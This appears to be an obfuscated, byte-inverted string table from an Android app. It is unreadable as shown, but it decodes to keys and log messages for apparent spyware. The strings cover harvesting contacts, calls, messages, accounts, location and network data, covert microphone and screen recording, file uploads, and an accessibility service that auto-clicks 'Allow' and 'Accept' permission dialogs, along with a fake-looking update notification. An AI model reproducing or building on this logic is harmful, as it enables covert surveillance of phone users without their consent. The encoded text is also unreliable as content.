￐ﾕﾌﾐﾑ￴ﾑﾚﾋᯍﾐﾍﾔﾫﾆﾏﾚ￻ﾨﾶﾹ᯳￴ﾑﾚﾋᯍﾐﾍﾔﾫﾆﾏﾚ￷ﾼﾺﾳ᯶ﾪﾳﾾﾭ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￶ﾙﾖﾓᯟﾯﾞﾋﾗﾌ�ﾝﾍ￫ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾇￒﾝﾖﾑﾞﾍﾆ￶ﾧￒﾹ᯳ﾳﾺￒﾶﾻ￴ﾧￒﾹ᯳ﾳﾺￒﾫﾦﾯﾺ￺ﾨﾍﾐᯔﾘ�ﾻﾼ￫ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾇￒﾝﾖﾑﾞﾍﾆ￶ﾧￒﾹ᯳ﾳﾺￒﾶﾻ￴ﾧￒﾹ᯳ﾳﾺￒﾫﾦﾯﾺ￺ﾨﾍﾐᯔﾘ�ﾻﾼ￸ﾪﾱﾴ᯴ﾰﾨﾱ￳ﾜﾐﾑᯔﾚﾜﾋﾖﾉﾖﾋﾆ￳ﾌﾋﾐᯈﾞﾘﾚﾼﾓﾞﾌﾌ￻ﾋﾆﾏᯟ￷ﾖﾑﾋᯟﾍﾑﾞﾓ￺ﾖﾒﾞᯝﾚ￺ﾉﾖﾛᯟﾐ￺ﾞﾊﾛᯓﾐ￺ﾙﾖﾓᯟﾌ￷ﾖﾑﾋᯟﾍﾑﾞﾓ￷ﾚﾇﾋᯟﾍﾑﾞﾓ￺ﾖﾒﾞᯝﾚ￺ﾉﾖﾛᯟﾐ￺ﾞﾊﾛᯓﾐ￺ﾙﾖﾓᯟﾌ￷ﾚﾇﾋᯟﾍﾑﾞﾓ￹ﾌﾛﾜᯛﾍﾛ�ﾖﾛ�ﾖﾛ￯ﾺﾧﾫ᯿ﾭﾱﾾﾳﾠﾬﾫﾰﾭﾾﾸﾺ�ﾖﾛ�ﾖﾛ�ﾖﾛ￺ﾏﾗﾐᯔﾚ￷ﾓﾐﾜᯛﾋﾖﾐﾑ￳ﾜﾐﾑᯔﾚﾜﾋﾖﾉﾖﾋﾆ￸ﾞﾜﾜᯕﾊﾑﾋ￘ﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾾﾼﾼﾺﾬﾬﾠﾹﾶﾱﾺﾠﾳﾰﾼﾾﾫﾶﾰﾱￖﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾾﾼﾼﾺﾬﾬﾠﾼﾰﾾﾭﾬﾺﾠﾳﾰﾼﾾﾫﾶﾰﾱ￼ﾘﾏﾌ￼ﾘﾏﾌ￵ﾊﾌﾞᯝﾚﾌﾋﾞﾋﾌ￱ﾝﾞﾋᯎﾚﾍﾆﾒﾞﾑﾞﾘﾚﾍ￲ﾞﾜﾜᯟﾌﾌﾖﾝﾖﾓﾖﾋﾆ￲ﾾﾼﾼ᯿ﾬﾬﾶﾽﾶﾳﾶﾫﾦ￲ﾾﾼﾼ᯿ﾬﾬﾶﾽﾶﾳﾶﾫﾦ￲ﾛﾚﾉᯓﾜﾚﾠﾏﾐﾓﾖﾜﾆ￳ﾻﾺﾩ᯳ﾼﾺ￟ﾾﾻﾲﾶﾱ￳ﾻﾺﾩ᯳ﾼﾺ￟ﾾﾻﾲﾶﾱ￭ﾘﾍﾞᯔﾋﾚﾛﾯﾚﾍﾒﾖﾌﾌﾖﾐﾑﾌ￮ﾛﾚﾑᯓﾚﾛﾯﾚﾍﾒﾖﾌﾌﾖﾐﾑﾌ￵ﾞﾑﾛᯈﾐﾖﾛﾠﾖﾛ￶ﾞﾑﾛᯈﾐﾖﾛﾶﾛ￳ﾒﾞﾑᯏﾙﾞﾜﾋﾊﾍﾚﾍ￸ﾉﾚﾍᯉﾖﾐﾑ￵ﾞﾏﾔᯬﾚﾍﾌﾖﾐﾑ￱ﾉﾚﾍᯉﾖﾐﾑﾭﾚﾓﾚﾞﾌﾚ￳ﾲﾐﾛᯟﾓ￟ﾱﾊﾒﾝﾚﾍ￶ﾋﾖﾒᯟﾌﾋﾞﾒﾏ￶ﾊﾌﾞᯝﾚﾶﾑﾙﾐ￪ﾖﾑﾌᯎﾞﾓﾓﾞﾋﾖﾐﾑﾫﾖﾒﾚﾌﾋﾞﾒﾏ￪ﾖﾑﾌᯎﾞﾓﾓﾞﾋﾖﾐﾑﾫﾖﾒﾚﾬﾋﾞﾒﾏ￣ﾶﾑﾌᯎﾞﾓﾓﾞﾋﾖﾐﾑﾻﾞﾋﾚﾱﾐﾋﾾﾉﾞﾖﾓﾞﾝﾓﾚ￴ﾏﾗﾐᯔﾚﾱﾊﾒﾝﾚﾍ￷ﾓﾞﾋᯓﾋﾊﾛﾚ￶ﾓﾐﾑᯝﾖﾋﾊﾛﾚ￴ﾑﾚﾋᯍﾐﾍﾔﾫﾆﾏﾚ￻ﾨﾶﾹ᯳￴ﾑﾚﾋᯍﾐﾍﾔﾫﾆﾏﾚ￷ﾼﾺﾳ᯶ﾪﾳﾾﾭ￸ﾝﾞﾋᯎﾚﾍﾆ￹ﾝﾊﾜᯑﾚﾋ￰ﾞﾏﾏᯩﾏﾚﾜﾖﾙﾖﾜﾶﾑﾙﾐ￰ﾞﾏﾏᯩﾏﾚﾜﾖﾙﾖﾜﾶﾑﾙﾐ￰ﾞﾏﾏᯩﾏﾚﾜﾖﾙﾖﾜﾶﾑﾙﾐ￶ﾙﾜﾒᯥﾋﾐﾔﾚﾑ￶ﾙﾜﾒᯥﾋﾐﾔﾚﾑ￶ﾙﾜﾒᯥﾋﾐﾔﾚﾑ￭ﾑﾐﾋᯥﾍﾚﾘﾖﾌﾋﾚﾍﾚﾛﾠﾆﾚﾋ￻ﾑﾞﾒᯟ￻ﾋﾆﾏᯟ￷ﾞﾜﾜᯕﾊﾑﾋﾌ￲￐ﾏﾍᯕﾜ￐ﾑﾚﾋ￐ﾞﾍﾏ￲ﾖﾏ￟ᯔﾚﾖﾘﾗ￟ﾌﾗﾐﾈ￴ﾗﾐﾋᯉﾏﾐﾋﾶﾑﾙﾐ￩ﾒﾖﾊᯓﾽﾘﾳﾞﾊﾑﾜﾗﾯﾚﾍﾒﾖﾌﾌﾖﾐﾑ￩ﾒﾖﾊᯓﾽﾘﾳﾞﾊﾑﾜﾗﾯﾚﾍﾒﾖﾌﾌﾖﾐﾑ￩ﾒﾖﾊᯓﾽﾘﾳﾞﾊﾑﾜﾗﾯﾚﾍﾒﾖﾌﾌﾖﾐﾑ￦ﾒﾖﾽᯝﾯﾚﾍﾒﾖﾌﾌﾖﾐﾑﾼﾗﾚﾜﾔﾮﾊﾚﾊﾚﾛ￺ﾏﾐﾈᯟﾍ￷ﾌﾜﾍᯟﾚﾑﾰﾑ￢ﾞﾜﾜᯟﾌﾌﾖﾝﾖﾓﾖﾋﾆﾬﾚﾍﾉﾖﾜﾚﾶﾌﾭﾊﾑﾑﾖﾑﾘ￣ﾖﾌﾬᯙﾍﾚﾚﾑﾭﾚﾜﾐﾍﾛﾖﾑﾘﾮﾊﾚﾊﾚﾾﾜﾋﾖﾉﾚ￲ﾈﾆﾑᯑﾭﾚﾜﾐﾍﾛﾖﾑﾘ￱ﾈﾆﾑᯑﾲﾐﾑﾖﾋﾐﾍﾖﾑﾘ￳ﾗﾊﾒᯨﾚﾜﾐﾍﾛﾖﾑﾘ￲ﾗﾊﾒ᯷ﾐﾑﾖﾋﾐﾍﾖﾑﾘ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￺ﾏﾗﾐᯔﾚ￻ﾋﾆﾏᯟ￻ﾛﾞﾋᯟ￻ﾑﾞﾒᯟ￷ﾛﾊﾍᯛﾋﾖﾐﾑ￶ﾋﾖﾒᯟﾌﾋﾞﾒﾏ￼ﾠﾖﾛ￹ﾑﾊﾒᯘﾚﾍ￻ﾋﾆﾏᯟ￻ﾛﾞﾋᯟ￷ﾛﾊﾍᯛﾋﾖﾐﾑ￻ﾑﾞﾒᯟ￶ﾛﾞﾋᯟ￟ﾻﾺﾬﾼ￹ﾑﾊﾒᯘﾚﾍ￻ﾋﾆﾏᯟ￻ﾛﾞﾋᯟ￵ﾛﾛ￐᯷ﾲ￐ﾆﾆﾆﾆ￻ﾑﾞﾒᯟ￷ﾛﾊﾍᯛﾋﾖﾐﾑ￺ﾜﾞﾓᯖﾌ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￺ﾛﾞﾋᯛￎ￳ﾛﾖﾌᯊﾓﾞﾆﾠﾑﾞﾒﾚ￺ﾛﾞﾋᯛￌ￶ﾏﾗﾐᯎﾐﾠﾊﾍﾖ￼ﾠﾖﾛ￹ﾓﾐﾐᯑﾊﾏ￺ﾛﾞﾋᯛￍ￺ﾛﾞﾋᯛￎ￳ﾛﾖﾌᯊﾓﾞﾆﾠﾑﾞﾒﾚ￺ﾛﾞﾋᯛￍ￺ﾛﾞﾋᯛￌ￴ﾏﾗﾐᯔﾚﾱﾊﾒﾝﾚﾍ￻ﾑﾞﾒᯟ￻ﾋﾆﾏᯟ￺ﾓﾞﾝᯟﾓ￬ﾾﾏﾏᯩﾏﾚﾜﾖﾙﾖﾜﾼﾐﾑﾋﾞﾜﾋﾌ￷ﾜﾐﾑᯎﾞﾜﾋﾌ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￺ﾖﾒﾞᯝﾚ￷ﾖﾑﾋᯟﾍﾑﾞﾓ￺ﾉﾖﾛᯟﾐ￷ﾖﾑﾋᯟﾍﾑﾞﾓ￺ﾞﾊﾛᯓﾐ￷ﾖﾑﾋᯟﾍﾑﾞﾓ￷ﾖﾑﾋᯟﾍﾑﾞﾓ￺ﾙﾖﾓᯟﾌ￺ﾙﾖﾓᯟﾌ￸ﾒﾐﾊᯔﾋﾚﾛ￺ﾖﾒﾞᯝﾚ￷ﾚﾇﾋᯟﾍﾑﾞﾓ￺ﾉﾖﾛᯟﾐ￷ﾚﾇﾋᯟﾍﾑﾞﾓ￺ﾞﾊﾛᯓﾐ￷ﾚﾇﾋᯟﾍﾑﾞﾓ￷ﾚﾇﾋᯟﾍﾑﾞﾓ￺ﾙﾖﾓᯟﾌ￷ﾚﾇﾋᯟﾍﾑﾞﾓ￸ﾪﾱﾴ᯴ﾰﾨﾱￚﾜﾐﾒᮔﾞﾑﾛﾍﾐﾖﾛ￑ﾚﾇﾋﾚﾍﾑﾞﾓﾌﾋﾐﾍﾞﾘﾚ￑ﾛﾐﾜﾊﾒﾚﾑﾋﾌ￫ﾏﾍﾖᯗﾞﾍﾆￅﾾﾑﾛﾍﾐﾖﾛ￐ﾛﾞﾋﾞ￳ﾾﾑﾛᯈﾐﾖﾛ￐ﾛﾞﾋﾞ￾￐�ﾖﾛ￷ﾙﾖﾓᯟﾱﾞﾒﾚ￻ﾌﾖﾅᯟ￻ﾋﾆﾏᯟ￳ﾌﾋﾐᯈﾞﾘﾚﾼﾓﾞﾌﾌ￹ﾌﾛﾜᯛﾍﾛ￱ﾓﾞﾌᯎﾲﾐﾛﾖﾙﾖﾚﾛﾾﾋ�ﾖﾛ￷ﾙﾖﾓᯟﾱﾞﾒﾚ￻ﾌﾖﾅᯟ￻ﾋﾆﾏᯟ￸ﾪﾱﾴ᯴ﾰﾨﾱ￳ﾌﾋﾐᯈﾞﾘﾚﾼﾓﾞﾌﾌ￯ﾺﾧﾫ᯿ﾭﾱﾾﾳﾠﾬﾫﾰﾭﾾﾸﾺ￱ﾓﾞﾌᯎﾲﾐﾛﾖﾙﾖﾚﾛﾾﾋ￶ﾙﾖﾓᯟﾯﾞﾋﾗﾌ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￶ﾙﾖﾓᯟﾯﾞﾋﾗﾌ￳ﾾﾑﾛᯈﾐﾖﾛ￐ﾛﾞﾋﾞ￺ﾖﾒﾞᯝﾚ￼ﾠﾖﾛ￲ﾠﾛﾖᯉﾏﾓﾞﾆﾠﾑﾞﾒﾚ￺ﾠﾌﾖᯀﾚ￵ﾛﾞﾋᯟﾠﾞﾛﾛﾚﾛ￺ﾞﾊﾛᯓﾐ￼ﾠﾖﾛ￲ﾠﾛﾖᯉﾏﾓﾞﾆﾠﾑﾞﾒﾚ￺ﾠﾌﾖᯀﾚ￵ﾛﾞﾋᯟﾠﾞﾛﾛﾚﾛ￺ﾉﾖﾛᯟﾐ￼ﾠﾖﾛ￲ﾠﾛﾖᯉﾏﾓﾞﾆﾠﾑﾞﾒﾚ￺ﾠﾌﾖᯀﾚ￵ﾛﾞﾋᯟﾠﾞﾛﾛﾚﾛ￺ﾙﾖﾓᯟﾌ￼ﾠﾖﾛ￲ﾠﾛﾖᯉﾏﾓﾞﾆﾠﾑﾞﾒﾚ￺ﾠﾌﾖᯀﾚ￵ﾛﾞﾋᯟﾠﾞﾛﾛﾚﾛ￳ﾒﾚﾛᯓﾞﾠﾋﾆﾏﾚￂￏ�ﾖﾛ￷ﾙﾖﾓᯟﾱﾞﾒﾚ￻ﾌﾖﾅᯟ￻ﾋﾆﾏᯟ￳ﾌﾋﾐᯈﾞﾘﾚﾼﾓﾞﾌﾌ￳ﾓﾞﾌᯎﾲﾐﾛﾖﾙﾖﾚﾛ￶ﾙﾖﾓᯟﾯﾞﾋﾗﾌ￶ﾙﾖﾓᯟﾯﾞﾋﾗﾌ￶ﾙﾖﾓᯟﾯﾞﾋﾗﾌ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￺ﾈﾆﾑᯑﾌ￶ﾍﾚﾜᯕﾍﾛﾖﾑﾘ￻ﾑﾞﾒᯟ￻ﾌﾖﾅᯟ￹ﾌﾜﾍᯟﾚﾑ￻￑ﾞﾒᯈ￹ﾜﾞﾒᯟﾍﾞ￼ﾒﾖﾜ￼ﾯﾸﾭ￸ﾺﾍﾍᯕﾍￅ￟￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￼ﾯﾸﾭ￺ﾺﾍﾍᯕﾍ￺ﾋﾞﾌᯑﾌ￻ﾑﾞﾒᯟ￻ﾋﾖﾒᯟ￷ﾜﾗﾖᯖﾛﾍﾚﾑ￻ﾌﾖﾅᯟ￺ﾋﾞﾌᯑﾌ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￺ﾋﾞﾌᯑﾌ￼ﾐﾊﾋ￣ﾼﾞﾓᯖﾖﾑﾘ￟ﾭﾚﾎﾊﾚﾌﾋ￟ﾫﾞﾌﾔ￟ﾭﾚﾌﾊﾓﾋ￑￤ﾭﾚﾎᯏﾚﾌﾋ￟ﾫﾞﾌﾔ￟ﾭﾚﾌﾊﾓﾋ￟ﾬﾖﾅﾚ￟ￅ￟￹ﾋﾞﾌᯑﾶﾛ￢ﾪﾏﾓᯕﾞﾛ￟ﾫﾞﾌﾔ￟ﾭﾚﾌﾊﾓﾋ￑￟ﾫﾞﾌﾔﾶﾛ￟ￅ￟￮ﾪﾏﾓᯕﾞﾛﾖﾑﾘ￟ﾹﾖﾓﾚ￟ￅ￟￵￟ﾫﾞᯉﾔﾶﾛ￟ￅ￟￩ﾱﾐ￟ᯜﾖﾓﾚﾌ￟ﾙﾐﾍ￟ﾫﾞﾌﾔﾶﾛ￟ￅ￟￫ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾇￒﾝﾖﾑﾞﾍﾆ￶ﾧￒﾫ᯻ﾬﾴￒﾶﾻ￴ﾧￒﾹ᯳ﾳﾺￒﾫﾦﾯﾺ￯ﾧￒﾫ᯻ﾬﾴￒﾫﾶﾲﾺﾬﾫﾾﾲﾯ￣ﾆﾆﾆᯃￒﾲﾲￒﾛﾛￒﾷﾷ￘ﾗ￘ￒﾒﾒ￘ﾒ￘ￒﾌﾌ￘ﾌ￘￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￼ﾞﾓﾓ￼ﾞﾓﾓ￹ﾋﾞﾌᯑﾶﾛ￺ﾋﾞﾌᯑﾌ￺ﾋﾞﾌᯑﾌ￺ﾏﾗﾐᯔﾚ￻ﾋﾆﾏᯟ￻ﾛﾞﾋᯟ￻ﾝﾐﾛᯃ￶ﾋﾖﾒᯟﾌﾋﾞﾒﾏ￼ﾠﾖﾛ￸ﾞﾛﾛᯈﾚﾌﾌ￶ﾋﾗﾍᯟﾞﾛﾠﾖﾛ￻ﾝﾐﾛᯃ￻ﾛﾞﾋᯟ￻ﾋﾆﾏᯟ￶ﾛﾞﾋᯟ￟ﾻﾺﾬﾼ￸ﾞﾛﾛᯈﾚﾌﾌ￻ﾋﾆﾏᯟ￻ﾛﾞﾋᯟ￵ﾛﾛ￐᯷ﾲ￐ﾆﾆﾆﾆ￻ﾝﾐﾛᯃ￷ﾒﾚﾌᯉﾞﾘﾚﾌ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￼ﾷﾪﾲ￻ﾨﾦﾱᯱ￶ﾍﾚﾜᯕﾍﾛﾖﾑﾘ￺ﾈﾆﾑᯑﾌ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￳ﾜﾓﾚᯛﾍﾭﾚﾜﾐﾍﾛﾌ￶ﾍﾚﾜᯕﾍﾛﾖﾑﾘ￫ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾇￒﾝﾖﾑﾞﾍﾆ￶ﾧￒﾹ᯳ﾳﾺￒﾶﾻ￶ﾧￒﾯ᯿ﾱﾻﾶﾱﾸ￹ﾚﾇﾋᯟﾑﾛ￹ﾚﾇﾋᯟﾑﾛ￱ﾗﾊﾒ᯿ﾇﾋﾚﾑﾛﾯﾍﾚﾙﾌￕﾷﾊﾒ᯿ﾑﾛﾫﾖﾒﾚ￟ﾱﾐﾋ￟ﾹﾐﾊﾑﾛ￟ﾖﾑ￟ﾬﾗﾞﾍﾚﾛ￟ﾯﾍﾚﾙﾚﾍﾚﾑﾜﾚﾌ￵ﾗﾊﾒ᯿ﾑﾛﾫﾖﾒﾚ￵ﾗﾊﾒ᯿ﾑﾛﾫﾖﾒﾚ￵ﾗﾊﾒ᯿ﾑﾛﾫﾖﾒﾚ￭ﾺﾇﾖᯉﾋﾖﾑﾘﾷﾊﾒﾫﾖﾒﾚ￟ￅ￟￱ￄ￟ﾺᯂﾋﾚﾑﾌﾖﾐﾑ￟ￅ￟￬ￄ￟ﾪᯊﾛﾞﾋﾚﾛﾷﾊﾒﾫﾖﾒﾚ￟ￅ￟￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￱ﾗﾊﾒ᯿ﾇﾋﾚﾑﾛﾯﾍﾚﾙﾌ￵ﾗﾊﾒ᯿ﾑﾛﾫﾖﾒﾚ￴ﾑﾚﾋᯍﾐﾍﾔﾫﾆﾏﾚ￻ﾨﾶﾹ᯳￴ﾑﾚﾋᯍﾐﾍﾔﾫﾆﾏﾚ￷ﾼﾺﾳ᯶ﾪﾳﾾﾭ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￶ﾙﾖﾓᯟﾯﾞﾋﾗﾌ�ﾝﾍ￫ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾇￒﾝﾖﾑﾞﾍﾆ￶ﾧￒﾹ᯳ﾳﾺￒﾶﾻ￴ﾧￒﾹ᯳ﾳﾺￒﾫﾦﾯﾺ￺ﾨﾍﾐᯔﾘ�ﾻﾼ￫ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾇￒﾝﾖﾑﾞﾍﾆ￶ﾧￒﾹ᯳ﾳﾺￒﾶﾻ￴ﾧￒﾹ᯳ﾳﾺￒﾫﾦﾯﾺ￺ﾨﾍﾐᯔﾘ�ﾻﾼ￸ﾪﾱﾴ᯴ﾰﾨﾱ￳ﾜﾐﾑᯔﾚﾜﾋﾖﾉﾖﾋﾆ￳ﾌﾋﾐᯈﾞﾘﾚﾼﾓﾞﾌﾌ￻ﾋﾆﾏᯟ￷ﾖﾑﾋᯟﾍﾑﾞﾓ￺ﾖﾒﾞᯝﾚ￺ﾉﾖﾛᯟﾐ￺ﾞﾊﾛᯓﾐ￺ﾙﾖﾓᯟﾌ￷ﾖﾑﾋᯟﾍﾑﾞﾓ￷ﾚﾇﾋᯟﾍﾑﾞﾓ￺ﾖﾒﾞᯝﾚ￺ﾉﾖﾛᯟﾐ￺ﾞﾊﾛᯓﾐ￺ﾙﾖﾓᯟﾌ￷ﾚﾇﾋᯟﾍﾑﾞﾓ￹ﾌﾛﾜᯛﾍﾛ�ﾖﾛ�ﾖﾛ￯ﾺﾧﾫ᯿ﾭﾱﾾﾳﾠﾬﾫﾰﾭﾾﾸﾺ�ﾖﾛ�ﾖﾛ�ﾖﾛ￺ﾈﾆﾑᯑﾌ￫ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾇￒﾝﾖﾑﾞﾍﾆ￶ﾧￒﾹ᯳ﾳﾺￒﾶﾻ￶ﾧￒﾯ᯿ﾱﾻﾶﾱﾸ￹ﾚﾇﾋᯟﾑﾛ￹ﾚﾇﾋᯟﾑﾛ￰ﾈﾖﾑᯑﾺﾇﾋﾚﾑﾛﾯﾍﾚﾙﾌￔﾨﾖﾑᯑﾺﾑﾛﾫﾖﾒﾚ￟ﾱﾐﾋ￟ﾹﾐﾊﾑﾛ￟ﾖﾑ￟ﾬﾗﾞﾍﾚﾛ￟ﾯﾍﾚﾙﾚﾍﾚﾑﾜﾚﾌ￴ﾈﾖﾑᯑﾺﾑﾛﾫﾖﾒﾚ￴ﾈﾖﾑᯑﾺﾑﾛﾫﾖﾒﾚ￴ﾈﾖﾑᯑﾺﾑﾛﾫﾖﾒﾚ￩ﾺﾇﾖᯉﾋﾖﾑﾘﾨﾖﾑﾔﾺﾑﾛﾫﾖﾒﾚ￟ￅ￟￱ￄ￟ﾺᯂﾋﾚﾑﾌﾖﾐﾑ￟ￅ￟￨ￄ￟ﾪᯊﾛﾞﾋﾚﾛﾨﾖﾑﾔﾺﾑﾛﾫﾖﾒﾚ￟ￅ￟￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￰ﾈﾖﾑᯑﾺﾇﾋﾚﾑﾛﾯﾍﾚﾙﾌ￴ﾈﾖﾑᯑﾺﾑﾛﾫﾖﾒﾚ￹ﾧﾖﾞᯕﾒﾖ￸ﾘﾍﾞᯔﾋﾚﾛ￶ﾜﾗﾚᯙﾔﾚﾛﾰﾑ￯ﾜﾗﾚᯙﾔﾚﾛﾫﾖﾒﾚﾬﾋﾞﾒﾏ￲ﾊﾏﾛᯛﾋﾚﾼﾐﾑﾋﾚﾇﾋ￩ﾒﾖﾊᯓﾽﾘﾳﾞﾊﾑﾜﾗﾯﾚﾍﾒﾖﾌﾌﾖﾐﾑ￞ﾲﾶﾪ᯳￟ﾽﾞﾜﾔﾘﾍﾐﾊﾑﾛ￟ﾯﾚﾍﾒﾖﾌﾌﾖﾐﾑ￟ﾍﾚﾌﾊﾓﾋ￦ﾮﾊﾚᯏﾚﾖﾑﾘ￟ﾨﾆﾑﾔ￟ﾏﾐﾌﾋ￟ﾍﾚﾝﾐﾐﾋ￲ﾾﾓﾙᯈﾚﾛﾬﾚﾍﾉﾖﾜﾚ￫ﾶﾑﾌᯓﾛﾚ￟ﾗﾞﾑﾛﾓﾚ￟ﾭﾚﾝﾐﾐﾋ￲ﾾﾓﾙᯈﾚﾛﾬﾚﾍﾉﾖﾜﾚ￥ﾾﾝﾐᯏﾋ￟ﾋﾐ￟ﾍﾚﾌﾋﾞﾍﾋ￟ﾍﾚﾜﾐﾍﾛﾖﾑﾘ￘ﾬﾜﾍᯟﾚﾑ￟ﾖﾌ￟ﾓﾐﾜﾔﾚﾛ￟ﾎﾊﾚﾊﾚﾖﾑﾘ￟ﾋﾗﾚ￟ﾍﾚﾜﾐﾍﾛﾖﾑﾘ￼ﾒﾖﾜ￬ﾾﾏﾏ᯸ﾊﾜﾔﾚﾋﾯﾍﾚﾉﾚﾑﾋﾖﾐﾑ￶ﾬﾋﾞᯈﾋ￟ﾑﾐﾈ￺ﾾﾓﾓᯕﾈ￷ﾾﾜﾋᯓﾉﾞﾋﾚ￻ﾱﾚﾇᯎ￹ﾾﾜﾜᯟﾏﾋ￲ﾾﾓﾙᯈﾚﾛﾬﾚﾍﾉﾖﾜﾚ￱ﾵﾊﾌᯎ￟ﾽﾐﾍﾑ￟ﾑﾐﾈ￞￷ﾔﾚﾆᯝﾊﾞﾍﾛ￺ﾏﾐﾈᯟﾍ￲ﾾﾓﾙᯈﾚﾛﾬﾚﾍﾉﾖﾜﾚￒﾖﾌﾾᯊﾏﾶﾑﾹﾐﾍﾚﾘﾍﾐﾊﾑﾛ￟ﾾﾏﾏﾯﾍﾐﾜﾚﾌﾌﾶﾑﾙﾐ￟ﾶﾒﾏﾐﾍﾋﾞﾑﾜﾚￅ￟￱ﾏﾍﾐᯙﾚﾌﾌ￟ﾑﾞﾒﾚￅ￟￬￑ﾜﾞᯔﾳﾞﾊﾑﾜﾗﾧﾾﾜﾋﾖﾉﾖﾋﾆ￶ﾌﾜﾍᯟﾚﾑﾼﾞﾏ￲ﾯﾚﾑᯞﾖﾑﾘﾾﾓﾙﾍﾚﾛ￲ﾯﾚﾑᯞﾖﾑﾘﾾﾓﾙﾍﾚﾛ￼ﾒﾖﾜ￲ﾾﾓﾙᯈﾚﾛﾬﾚﾍﾉﾖﾜﾚ￭ﾼﾞﾓᯖﾖﾑﾘ￟ﾳﾞﾊﾑﾜﾗ￟ﾾﾏﾏ￴ﾾﾓﾙᯈﾚﾛﾲﾖﾽﾋﾑ￉ﾻﾖﾌᯊﾓﾞﾆ￟ﾏﾐﾏￒﾊﾏ￟ﾈﾖﾑﾛﾐﾈﾌ￟ﾈﾗﾖﾓﾚ￟ﾍﾊﾑﾑﾖﾑﾘ￟ﾖﾑ￟ﾋﾗﾚ￟ﾝﾞﾜﾔﾘﾍﾐﾊﾑﾛ￲ﾾﾓﾙᯈﾚﾛﾬﾚﾍﾉﾖﾜﾚￜﾹﾖﾑᯞﾖﾑﾘ￟ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￟ﾙﾐﾍ￟ﾝﾞﾜﾔﾘﾍﾐﾊﾑﾛￅ￟￲ﾾﾓﾙᯈﾚﾛﾬﾚﾍﾉﾖﾜﾚ￘ﾼﾓﾖᯙﾔﾚﾛ￟ﾋﾗﾚ￟ﾝﾞﾜﾔﾘﾐﾊﾑﾛ￟ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￟ﾝﾊﾋﾋﾐﾑ￳ﾾﾓﾈᯛﾆﾌ￟ﾞﾓﾓﾐﾈ￹ﾾﾜﾜᯟﾏﾋ￲ﾾﾓﾙᯈﾚﾛﾬﾚﾍﾉﾖﾜﾚ￶ﾾﾋﾋᯟﾒﾏﾋￅ￟￶ﾍﾚﾜᯕﾍﾛﾖﾑﾘ￳ﾑﾐﾋᯓﾙﾖﾜﾞﾋﾖﾐﾑ￳ﾑﾐﾋᯓﾙﾖﾜﾞﾋﾖﾐﾑ￵ﾾﾏﾏᮚﾪﾏﾛﾞﾋﾚ￵ﾾﾏﾏᮚﾪﾏﾛﾞﾋﾚ￼ﾒﾌﾘ￴ﾪﾏﾛᯛﾋﾖﾑﾘ￑￑￑￫ﾼﾗﾚᯙﾔﾖﾑﾘ￟ﾙﾐﾍ￟ﾊﾏﾛﾞﾋﾚﾌ￵ﾞﾑﾛᯈﾐﾖﾛﾠﾖﾛ￶ﾞﾑﾛᯈﾐﾖﾛﾶﾛ￳ﾒﾞﾑᯏﾙﾞﾜﾋﾊﾍﾚﾍ￸ﾉﾚﾍᯉﾖﾐﾑ￱ﾉﾚﾍᯉﾖﾐﾑﾭﾚﾓﾚﾞﾌﾚ￴ﾒﾐﾛᯟﾓﾱﾊﾒﾝﾚﾍ￹ﾛﾚﾉᯓﾜﾚ￷ﾏﾖﾑᯝﾫﾖﾒﾚ￶ﾋﾖﾒᯟﾌﾋﾞﾒﾏ￼ﾒﾖﾜ￶ﾌﾋﾞᯈﾋﾚﾛﾾﾋ￰ﾚﾇﾏᯟﾜﾋﾚﾛﾺﾑﾛﾫﾖﾒﾚ￹ﾜﾞﾒᯟﾍﾞ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￺ﾛﾚﾓᯛﾆ￫ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾇￒﾝﾖﾑﾞﾍﾆ￶ﾧￒﾹ᯳ﾳﾺￒﾶﾻ￱ﾗﾊﾒ᯿ﾇﾋﾚﾑﾛﾯﾍﾚﾙﾌ￵ﾗﾊﾒ᯿ﾑﾛﾫﾖﾒﾚ￱ﾗﾊﾒ᯿ﾇﾋﾚﾑﾛﾯﾍﾚﾙﾌ￵ﾗﾊﾒ᯿ﾑﾛﾫﾖﾒﾚ￱ﾗﾊﾒ᯿ﾇﾋﾚﾑﾛﾯﾍﾚﾙﾌ￵ﾗﾊﾒ᯿ﾑﾛﾫ